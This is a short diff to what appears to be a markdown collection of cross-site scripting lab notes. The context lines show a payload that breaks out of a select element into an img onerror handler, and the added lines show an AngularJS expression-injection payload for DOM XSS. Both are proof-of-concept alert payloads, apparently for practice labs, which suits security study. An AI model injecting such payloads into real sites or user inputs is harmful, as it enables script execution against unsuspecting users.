@@ -11,3 +11,13 @@ ____
 ```html
 test</select><img src=1 onerror=alert(1)>
 ```
+
+# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
+`ng-app`
+
+```js
+{{$on.constructor('alert(1)')()}}
+```
+
+
